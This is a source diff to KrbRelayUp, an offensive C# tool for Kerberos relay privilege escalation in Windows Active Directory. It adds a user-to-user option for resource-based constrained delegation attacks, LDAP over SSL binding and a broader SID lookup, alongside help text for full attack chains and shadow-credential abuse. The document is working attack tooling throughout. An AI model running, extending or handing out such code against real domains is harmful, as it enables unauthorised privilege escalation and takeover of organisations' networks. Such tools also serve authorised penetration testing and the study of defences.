@@ -1,6 +1,5 @@
 using System;
 using System.DirectoryServices.Protocols;
-using System.Reflection;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -43,7 +42,8 @@ namespace KrbRelayUp
         public static string rbcdComputerPassword = null;
         public static string rbcdComputerPasswordHash = null;
         public static string rbcdComputerSid = null;
-        
+        public static bool rbcdUseU2U = false;
+
         // SHADOWCRED Method
         public static bool shadowCredForce = false;
         public static string shadowCredCertificate = null;
@@ -75,7 +75,7 @@ namespace KrbRelayUp
 
     class Program
     {
-        
+
         public static void GetHelp()
         {
             Console.WriteLine("FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.");
@@ -90,6 +90,7 @@ namespace KrbRelayUp
             Console.WriteLine("    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
             Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
             Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
+            Console.WriteLine("    -u2u (--UseU2U)                   Treat the computer account (provided within -cn flag) as a user account for RBCD with UPNs (https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)");
             Console.WriteLine("");
             Console.WriteLine("    # SHADOWCRED Method:");
             Console.WriteLine("    -f   (--ForceShadowCred)          Clear the msDS-KeyCredentialLink attribute of the attacked computer account before adding our new shadow credentials. (Optional)");
@@ -130,7 +131,7 @@ namespace KrbRelayUp
             Console.WriteLine("    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)");
             Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");
 
-            
+
             Console.WriteLine("");
         }
 
@@ -185,10 +186,12 @@ namespace KrbRelayUp
             int iComputerName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cn|ComputerName)$").Match(s).Success);
             int iComputerPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|ComputerPassword)$").Match(s).Success);
             int iComputerPasswordHash = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ch|ComputerPasswordHash)$").Match(s).Success);
+            int iUseU2U = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(u2u|UseU2U)$").Match(s).Success);
             Options.rbcdCreateNewComputerAccount = (iCreateNewComputerAccount != -1) ? true : Options.rbcdCreateNewComputerAccount;
             Options.rbcdComputerName = (iComputerName != -1) ? args[iComputerName + 1].TrimEnd('$') : Options.rbcdComputerName;
             Options.rbcdComputerPassword = (iComputerPassword != -1) ? args[iComputerPassword + 1] : Options.rbcdComputerPassword;
             Options.rbcdComputerPasswordHash = (iComputerPasswordHash != -1) ? args[iComputerPasswordHash + 1] : Options.rbcdComputerPasswordHash;
+            Options.rbcdUseU2U = (iUseU2U != -1) ? true : Options.rbcdUseU2U;
 
             // SHADOWCRED Method
             int iShadowCredForce = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(f|ForceShadowCred)$").Match(s).Success);
@@ -291,8 +294,18 @@ namespace KrbRelayUp
                 // Bind to LDAP using current authenticated user
                 LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(Options.domainController, Options.ldapPort);
                 LdapConnection ldapConnection = new LdapConnection(identifier);
-                ldapConnection.SessionOptions.Sealing = true;
-                ldapConnection.SessionOptions.Signing = true;
+
+                if (Options.useSSL)
+                {
+                    ldapConnection.SessionOptions.ProtocolVersion = 3;
+                    ldapConnection.SessionOptions.SecureSocketLayer = true;
+                }
+                else
+                {
+                    ldapConnection.SessionOptions.Sealing = true;
+                    ldapConnection.SessionOptions.Signing = true;
+                }
+
                 ldapConnection.Bind();
 
                 if (Options.relayAttackType == Relay.RelayAttackType.RBCD)
@@ -327,7 +340,7 @@ namespace KrbRelayUp
                     }
 
                     // Get Computer SID for RBCD
-                    Options.rbcdComputerSid = GetObjectSidForComputerName(ldapConnection, Options.rbcdComputerName, Options.domainDN);
+                    Options.rbcdComputerSid = GetObjectSidForAccountName(ldapConnection, Options.rbcdComputerName, Options.rbcdUseU2U, Options.domainDN);
 
                 }
 
@@ -404,9 +417,18 @@ namespace KrbRelayUp
             }
         }
 
-        public static string GetObjectSidForComputerName(LdapConnection ldapConnection, string computerName, string searchBase)
+        public static string GetObjectSidForAccountName(LdapConnection ldapConnection, string accountName, bool isUseU2U, string searchBase)
         {
-            string searchFilter = $"(sAMAccountName={computerName}$)";
+            string searchFilter = null;
+            if (isUseU2U)
+            {
+                searchFilter = $"(sAMAccountName={accountName})";
+            }
+            else
+            {
+                searchFilter = $"(sAMAccountName={accountName}$)";
+            }
+
             SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, SearchScope.Subtree, "DistinguishedName", "objectSid");
             try
             {
